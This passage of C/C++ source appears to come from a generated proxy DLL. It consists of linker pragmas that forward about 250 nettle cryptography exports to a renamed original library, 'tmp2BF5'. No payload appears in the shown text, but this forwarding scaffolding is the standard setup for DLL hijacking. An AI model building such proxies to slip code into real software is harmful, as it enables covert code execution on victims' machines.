&quot;/export:nettle_cnd_memcpy=tmp2BF5.nettle_cnd_memcpy,@219&quot;)#pragma comment(linker, &quot;/export:nettle_ctr_crypt=tmp2BF5.nettle_ctr_crypt,@220&quot;)#pragma comment(linker, &quot;/export:nettle_des3_decrypt=tmp2BF5.nettle_des3_decrypt,@221&quot;)#pragma comment(linker, &quot;/export:nettle_des3_encrypt=tmp2BF5.nettle_des3_encrypt,@222&quot;)#pragma comment(linker, &quot;/export:nettle_des3_set_key=tmp2BF5.nettle_des3_set_key,@223&quot;)#pragma comment(linker, &quot;/export:nettle_des_check_parity=tmp2BF5.nettle_des_check_parity,@224&quot;)#pragma comment(linker, &quot;/export:nettle_des_decrypt=tmp2BF5.nettle_des_decrypt,@225&quot;)#pragma comment(linker, &quot;/export:nettle_des_encrypt=tmp2BF5.nettle_des_encrypt,@226&quot;)#pragma comment(linker, &quot;/export:nettle_des_fix_parity=tmp2BF5.nettle_des_fix_parity,@227&quot;)#pragma comment(linker, &quot;/export:nettle_des_set_key=tmp2BF5.nettle_des_set_key,@228&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128=tmp2BF5.nettle_eax_aes128,@229&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_decrypt=tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_digest=tmp2BF5.nettle_eax_aes128_digest,@231&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_encrypt=tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_key=tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_set_nonce=tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)#pragma comment(linker, &quot;/export:nettle_eax_aes128_update=tmp2BF5.nettle_eax_aes128_update,@235&quot;)#pragma comment(linker, &quot;/export:nettle_eax_decrypt=tmp2BF5.nettle_eax_decrypt,@236&quot;)#pragma comment(linker, &quot;/export:nettle_eax_digest=tmp2BF5.nettle_eax_digest,@237&quot;)#pragma comment(linker, &quot;/export:nettle_eax_encrypt=tmp2BF5.nettle_eax_encrypt,@238&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_key=tmp2BF5.nettle_eax_set_key,@239&quot;)#pragma comment(linker, &quot;/export:nettle_eax_set_nonce=tmp2BF5.nettle_eax_set_nonce,@240&quot;)#pragma comment(linker, &quot;/export:nettle_eax_update=tmp2BF5.nettle_eax_update,@241&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128=tmp2BF5.nettle_gcm_aes128,@242&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_decrypt=tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_digest=tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_encrypt=tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_iv=tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_set_key=tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes128_update=tmp2BF5.nettle_gcm_aes128_update,@248&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192=tmp2BF5.nettle_gcm_aes192,@249&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_decrypt=tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_digest=tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_encrypt=tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_iv=tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_set_key=tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes192_update=tmp2BF5.nettle_gcm_aes192_update,@255&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256=tmp2BF5.nettle_gcm_aes256,@256&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_decrypt=tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_digest=tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_encrypt=tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_iv=tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_set_key=tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes256_update=tmp2BF5.nettle_gcm_aes256_update,@262&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_decrypt=tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_digest=tmp2BF5.nettle_gcm_aes_digest,@264&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_encrypt=tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_iv=tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_set_key=tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_aes_update=tmp2BF5.nettle_gcm_aes_update,@268&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128=tmp2BF5.nettle_gcm_camellia128,@269&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_decrypt=tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_digest=tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_encrypt=tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_iv=tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_set_key=tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia128_update=tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256=tmp2BF5.nettle_gcm_camellia256,@276&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_decrypt=tmp2BF5.nettle_gcm_camellia256_decrypt,@277&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_digest=tmp2BF5.nettle_gcm_camellia256_digest,@278&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_encrypt=tmp2BF5.nettle_gcm_camellia256_encrypt,@279&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_iv=tmp2BF5.nettle_gcm_camellia256_set_iv,@280&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_set_key=tmp2BF5.nettle_gcm_camellia256_set_key,@281&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_camellia256_update=tmp2BF5.nettle_gcm_camellia256_update,@282&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_decrypt=tmp2BF5.nettle_gcm_decrypt,@283&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_digest=tmp2BF5.nettle_gcm_digest,@284&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_encrypt=tmp2BF5.nettle_gcm_encrypt,@285&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_iv=tmp2BF5.nettle_gcm_set_iv,@286&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_set_key=tmp2BF5.nettle_gcm_set_key,@287&quot;)#pragma comment(linker, &quot;/export:nettle_gcm_update=tmp2BF5.nettle_gcm_update,@288&quot;)#pragma comment(linker, &quot;/export:nettle_get_aeads=tmp2BF5.nettle_get_aeads,@289&quot;)#pragma comment(linker, &quot;/export:nettle_get_armors=tmp2BF5.nettle_get_armors,@290&quot;)#pragma comment(linker, &quot;/export:nettle_get_ciphers=tmp2BF5.nettle_get_ciphers,@291&quot;)#pragma comment(linker, &quot;/export:nettle_get_hashes=tmp2BF5.nettle_get_hashes,@292&quot;)#pragma comment(linker, &quot;/export:nettle_get_macs=tmp2BF5.nettle_get_macs,@293&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94=tmp2BF5.nettle_gosthash94,@294&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_digest=tmp2BF5.nettle_gosthash94_digest,@295&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_init=tmp2BF5.nettle_gosthash94_init,@296&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94_update=tmp2BF5.nettle_gosthash94_update,@297&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp=tmp2BF5.nettle_gosthash94cp,@298&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_digest=tmp2BF5.nettle_gosthash94cp_digest,@299&quot;)#pragma comment(linker, &quot;/export:nettle_gosthash94cp_update=tmp2BF5.nettle_gosthash94cp_update,@300&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_expand=tmp2BF5.nettle_hkdf_expand,@301&quot;)#pragma comment(linker, &quot;/export:nettle_hkdf_extract=tmp2BF5.nettle_hkdf_extract,@302&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_digest=tmp2BF5.nettle_hmac_digest,@303&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_digest=tmp2BF5.nettle_hmac_gosthash94_digest,@304&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_set_key=tmp2BF5.nettle_hmac_gosthash94_set_key,@305&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94_update=tmp2BF5.nettle_hmac_gosthash94_update,@306&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_digest=tmp2BF5.nettle_hmac_gosthash94cp_digest,@307&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_set_key=tmp2BF5.nettle_hmac_gosthash94cp_set_key,@308&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_gosthash94cp_update=tmp2BF5.nettle_hmac_gosthash94cp_update,@309&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5=tmp2BF5.nettle_hmac_md5,@310&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_digest=tmp2BF5.nettle_hmac_md5_digest,@311&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_set_key=tmp2BF5.nettle_hmac_md5_set_key,@312&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_md5_update=tmp2BF5.nettle_hmac_md5_update,@313&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160=tmp2BF5.nettle_hmac_ripemd160,@314&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_digest=tmp2BF5.nettle_hmac_ripemd160_digest,@315&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_set_key=tmp2BF5.nettle_hmac_ripemd160_set_key,@316&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_ripemd160_update=tmp2BF5.nettle_hmac_ripemd160_update,@317&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_set_key=tmp2BF5.nettle_hmac_set_key,@318&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1=tmp2BF5.nettle_hmac_sha1,@319&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_digest=tmp2BF5.nettle_hmac_sha1_digest,@320&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_set_key=tmp2BF5.nettle_hmac_sha1_set_key,@321&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha1_update=tmp2BF5.nettle_hmac_sha1_update,@322&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224=tmp2BF5.nettle_hmac_sha224,@323&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_digest=tmp2BF5.nettle_hmac_sha224_digest,@324&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha224_set_key=tmp2BF5.nettle_hmac_sha224_set_key,@325&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256=tmp2BF5.nettle_hmac_sha256,@326&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_digest=tmp2BF5.nettle_hmac_sha256_digest,@327&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_set_key=tmp2BF5.nettle_hmac_sha256_set_key,@328&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha256_update=tmp2BF5.nettle_hmac_sha256_update,@329&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384=tmp2BF5.nettle_hmac_sha384,@330&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_digest=tmp2BF5.nettle_hmac_sha384_digest,@331&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha384_set_key=tmp2BF5.nettle_hmac_sha384_set_key,@332&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512=tmp2BF5.nettle_hmac_sha512,@333&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_digest=tmp2BF5.nettle_hmac_sha512_digest,@334&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_set_key=tmp2BF5.nettle_hmac_sha512_set_key,@335&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_sha512_update=tmp2BF5.nettle_hmac_sha512_update,@336&quot;)#pragma comment(linker, &quot;/export:nettle_hmac_update=tmp2BF5.nettle_hmac_update,@337&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get=tmp2BF5.nettle_knuth_lfib_get,@338&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_get_array=tmp2BF5.nettle_knuth_lfib_get_array,@339&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_init=tmp2BF5.nettle_knuth_lfib_init,@340&quot;)#pragma comment(linker, &quot;/export:nettle_knuth_lfib_random=tmp2BF5.nettle_knuth_lfib_random,@341&quot;)#pragma comment(linker, &quot;/export:nettle_lookup_hash=tmp2BF5.nettle_lookup_hash,@342&quot;)#pragma comment(linker, &quot;/export:nettle_md2=tmp2BF5.nettle_md2,@343&quot;)#pragma comment(linker, &quot;/export:nettle_md2_digest=tmp2BF5.nettle_md2_digest,@344&quot;)#pragma comment(linker, &quot;/export:nettle_md2_init=tmp2BF5.nettle_md2_init,@345&quot;)#pragma comment(linker, &quot;/export:nettle_md2_update=tmp2BF5.nettle_md2_update,@346&quot;)#pragma comment(linker, &quot;/export:nettle_md4=tmp2BF5.nettle_md4,@347&quot;)#pragma comment(linker, &quot;/export:nettle_md4_digest=tmp2BF5.nettle_md4_digest,@348&quot;)#pragma comment(linker, &quot;/export:nettle_md4_init=tmp2BF5.nettle_md4_init,@349&quot;)#pragma comment(linker, &quot;/export:nettle_md4_update=tmp2BF5.nettle_md4_update,@350&quot;)#pragma comment(linker, &quot;/export:nettle_md5=tmp2BF5.nettle_md5,@351&quot;)#pragma comment(linker, &quot;/export:nettle_md5_compress=tmp2BF5.nettle_md5_compress,@352&quot;)#pragma comment(linker, &quot;/export:nettle_md5_digest=tmp2BF5.nettle_md5_digest,@353&quot;)#pragma comment(linker, &quot;/export:nettle_md5_init=tmp2BF5.nettle_md5_init,@354&quot;)#pragma comment(linker, &quot;/export:nettle_md5_update=tmp2BF5.nettle_md5_update,@355&quot;)#pragma comment(linker, &quot;/export:nettle_memeql_sec=tmp2BF5.nettle_memeql_sec,@356&quot;)#pragma comment(linker, &quot;/export:nettle_memxor=tmp2BF5.nettle_memxor,@357&quot;)#pragma comment(linker, &quot;/export:nettle_memxor3=tmp2BF5.nettle_memxor3,@358&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2=tmp2BF5.nettle_pbkdf2,@359&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_gosthash94cp=tmp2BF5.nettle_pbkdf2_hmac_gosthash94cp,@360&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha1=tmp2BF5.nettle_pbkdf2_hmac_sha1,@361&quot;)#pragma comment(linker, &quot;/export:nettle_pbkdf2_hmac_sha256=tmp2BF5.nettle_pbkdf2_hmac_sha256,@362&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_digest=tmp2BF5.nettle_poly1305_aes_digest,@363&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_key=tmp2BF5.nettle_poly1305_aes_set_key,@364&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_set_nonce=tmp2BF5.nettle_poly1305_aes_set_nonce,@365&quot;)#pragma comment(linker, &quot;/export:nettle_poly1305_aes_update=tmp2BF5.nettle_poly1305_aes_update,@366&quot;)#pragma comment(linker, &quot;/export:nettle_realloc=tmp2BF5.nettle_realloc,@367&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160=tmp2BF5.nettle_ripemd160,@368&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_digest=tmp2BF5.nettle_ripemd160_digest,@369&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_init=tmp2BF5.nettle_ripemd160_init,@370&quot;)#pragma comment(linker, &quot;/export:nettle_ripemd160_update=tmp2BF5.nettle_ripemd160_update,@371&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_128_set_key=tmp2BF5.nettle_salsa20_128_set_key,@372&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_256_set_key=tmp2BF5.nettle_salsa20_256_set_key,@373&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_crypt=tmp2BF5.nettle_salsa20_crypt,@374&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_key=tmp2BF5.nettle_salsa20_set_key,@375&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20_set_nonce=tmp2BF5.nettle_salsa20_set_nonce,@376&quot;)#pragma comment(linker, &quot;/export:nettle_salsa20r12_crypt=tmp2BF5.nettle_salsa20r12_crypt,@377&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128=tmp2BF5.nettle_serpent128,@378&quot;)#pragma comment(linker, &quot;/export:nettle_serpent128_set_key=tmp2BF5.nettle_serpent128_set_key,@379&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192=tmp2BF5.nettle_serpent192,@380&quot;)#pragma comment(linker, &quot;/export:nettle_serpent192_set_key=tmp2BF5.nettle_serpent192_set_key,@381&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256=tmp2BF5.nettle_serpent256,@382&quot;)#pragma comment(linker, &quot;/export:nettle_serpent256_set_key=tmp2BF5.nettle_serpent256_set_key,@383&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_decrypt=tmp2BF5.nettle_serpent_decrypt,@384&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_encrypt=tmp2BF5.nettle_serpent_encrypt,@385&quot;)#pragma comment(linker, &quot;/export:nettle_serpent_set_key=tmp2BF5.nettle_serpent_set_key,@386&quot;)#pragma comment(linker, &quot;/export:nettle_sha1=tmp2BF5.nettle_sha1,@387&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_compress=tmp2BF5.nettle_sha1_compress,@388&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_digest=tmp2BF5.nettle_sha1_digest,@389&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_init=tmp2BF5.nettle_sha1_init,@390&quot;)#pragma comment(linker, &quot;/export:nettle_sha1_update=tmp2BF5.nettle_sha1_update,@391&quot;)#pragma comment(linker, &quot;/export:nettle_sha224=tmp2BF5.nettle_sha224,@392&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_digest=tmp2BF5.nettle_sha224_digest,@393&quot;)#pragma comment(linker, &quot;/export:nettle_sha224_init=tmp2BF5.nettle_sha224_init,@394&quot;)#pragma comment(linker, &quot;/export:nettle_sha256=tmp2BF5.nettle_sha256,@395&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_digest=tmp2BF5.nettle_sha256_digest,@396&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_init=tmp2BF5.nettle_sha256_init,@397&quot;)#pragma comment(linker, &quot;/export:nettle_sha256_update=tmp2BF5.nettle_sha256_update,@398&quot;)#pragma comment(linker, &quot;/export:nettle_sha384=tmp2BF5.nettle_sha384,@399&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_digest=tmp2BF5.nettle_sha384_digest,@400&quot;)#pragma comment(linker, &quot;/export:nettle_sha384_init=tmp2BF5.nettle_sha384_init,@401&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224=tmp2BF5.nettle_sha3_224,@402&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_digest=tmp2BF5.nettle_sha3_224_digest,@403&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_init=tmp2BF5.nettle_sha3_224_init,@404&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_224_update=tmp2BF5.nettle_sha3_224_update,@405&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256=tmp2BF5.nettle_sha3_256,@406&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_digest=tmp2BF5.nettle_sha3_256_digest,@407&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_init=tmp2BF5.nettle_sha3_256_init,@408&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_shake=tmp2BF5.nettle_sha3_256_shake,@409&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_256_update=tmp2BF5.nettle_sha3_256_update,@410&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384=tmp2BF5.nettle_sha3_384,@411&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_digest=tmp2BF5.nettle_sha3_384_digest,@412&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_init=tmp2BF5.nettle_sha3_384_init,@413&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_384_update=tmp2BF5.nettle_sha3_384_update,@414&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512=tmp2BF5.nettle_sha3_512,@415&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_digest=tmp2BF5.nettle_sha3_512_digest,@416&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_init=tmp2BF5.nettle_sha3_512_init,@417&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_512_update=tmp2BF5.nettle_sha3_512_update,@418&quot;)#pragma comment(linker, &quot;/export:nettle_sha3_permute=tmp2BF5.nettle_sha3_permute,@419&quot;)#pragma comment(linker, &quot;/export:nettle_sha512=tmp2BF5.nettle_sha512,@420&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224=tmp2BF5.nettle_sha512_224,@421&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_digest=tmp2BF5.nettle_sha512_224_digest,@422&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_224_init=tmp2BF5.nettle_sha512_224_init,@423&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256=tmp2BF5.nettle_sha512_256,@424&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_digest=tmp2BF5.nettle_sha512_256_digest,@425&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_256_init=tmp2BF5.nettle_sha512_256_init,@426&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_digest=tmp2BF5.nettle_sha512_digest,@427&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_init=tmp2BF5.nettle_sha512_init,@428&quot;)#pragma comment(linker, &quot;/export:nettle_sha512_update=tmp2BF5.nettle_sha512_update,@429&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_decrypt_message=tmp2BF5.nettle_siv_cmac_aes128_decrypt_message,@430&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_encrypt_message=tmp2BF5.nettle_siv_cmac_aes128_encrypt_message,@431&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes128_set_key=tmp2BF5.nettle_siv_cmac_aes128_set_key,@432&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_decrypt_message=tmp2BF5.nettle_siv_cmac_aes256_decrypt_message,@433&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_encrypt_message=tmp2BF5.nettle_siv_cmac_aes256_encrypt_message,@434&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_aes256_set_key=tmp2BF5.nettle_siv_cmac_aes256_set_key,@435&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_decrypt_message=tmp2BF5.nettle_siv_cmac_decrypt_message,@436&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_encrypt_message=tmp2BF5.nettle_siv_cmac_encrypt_message,@437&quot;)#pragma comment(linker, &quot;/export:nettle_siv_cmac_set_key=tmp2BF5.nettle_siv_cmac_set_key,@438&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128=tmp2BF5.nettle_twofish128,@439&quot;)#pragma comment(linker, &quot;/export:nettle_twofish128_set_key=tmp2BF5.nettle_twofish128_set_key,@440&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192=tmp2BF5.nettle_twofish192,@441&quot;)#pragma comment(linker, &quot;/export:nettle_twofish192_set_key=tmp2BF5.nettle_twofish192_set_key,@442&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256=tmp2BF5.nettle_twofish256,@443&quot;)#pragma comment(linker, &quot;/export:nettle_twofish256_set_key=tmp2BF5.nettle_twofish256_set_key,@444&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_decrypt=tmp2BF5.nettle_twofish_decrypt,@445&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_encrypt=tmp2BF5.nettle_twofish_encrypt,@446&quot;)#pragma comment(linker, &quot;/export:nettle_twofish_set_key=tmp2BF5.nettle_twofish_set_key,@447&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_digest=tmp2BF5.nettle_umac128_digest,@448&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_key=tmp2BF5.nettle_umac128_set_key,@449&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_set_nonce=tmp2BF5.nettle_umac128_set_nonce,@450&quot;)#pragma comment(linker, &quot;/export:nettle_umac128_update=tmp2BF5.nettle_umac128_update,@451&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_digest=tmp2BF5.nettle_umac32_digest,@452&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_key=tmp2BF5.nettle_umac32_set_key,@453&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_set_nonce=tmp2BF5.nettle_umac32_set_nonce,@454&quot;)#pragma comment(linker, &quot;/export:nettle_umac32_update=tmp2BF5.nettle_umac32_update,@455&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_digest=tmp2BF5.nettle_umac64_digest,@456&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_key=tmp2BF5.nettle_umac64_set_key,@457&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_set_nonce=tmp2BF5.nettle_umac64_set_nonce,@458&quot;)#pragma comment(linker, &quot;/export:nettle_umac64_update=tmp2BF5.nettle_umac64_update,@459&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_digest=tmp2BF5.nettle_umac96_digest,@460&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_key=tmp2BF5.nettle_umac96_set_key,@461&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_set_nonce=tmp2BF5.nettle_umac96_set_nonce,@462&quot;)#pragma comment(linker, &quot;/export:nettle_umac96_update=tmp2BF5.nettle_umac96_update,@463&quot;)#pragma comment(linker, &quot;/export:nettle_version_major=tmp2BF5.nettle_version_major,@464&quot;)#pragma comment(linker, &quot;/export:nettle_version_minor=tmp2BF5.nettle_version_minor,@465&quot;)#pragma comment(linker, &quot;/export:nettle_xrealloc=tmp2BF5.nettle_xrealloc,@466&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_decrypt_message=tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_encrypt_message=tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_decrypt_key=tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes128_set_encrypt_key=tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_decrypt_message=tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_encrypt_message=tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_decrypt_key=tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)#pragma comment(linker, &quot;/export:nettle_xts_aes256_set_encrypt_key=tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)#pragma comment(linker, 